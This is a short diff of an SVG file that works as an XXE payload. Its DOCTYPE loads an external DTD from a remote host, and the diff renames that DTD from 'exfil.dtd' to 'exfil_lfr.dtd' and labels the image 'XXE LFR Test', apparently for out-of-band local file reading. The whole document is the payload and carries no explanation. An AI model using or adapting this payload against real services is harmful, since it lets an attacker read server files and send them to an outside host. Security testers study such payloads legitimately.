@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-    <!ENTITY % ext SYSTEM "http://8000-im6dokjnnyjgrch1cwjqj-852cae94.manus.computer/exfil.dtd">
+    <!ENTITY % ext SYSTEM "http://8000-im6dokjnnyjgrch1cwjqj-852cae94.manus.computer/exfil_lfr.dtd">
     %ext;
 ]>
 <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
-    <text x="10" y="20">XXE Test</text>
+    <text x="10" y="20">XXE LFR Test</text>
 </svg>
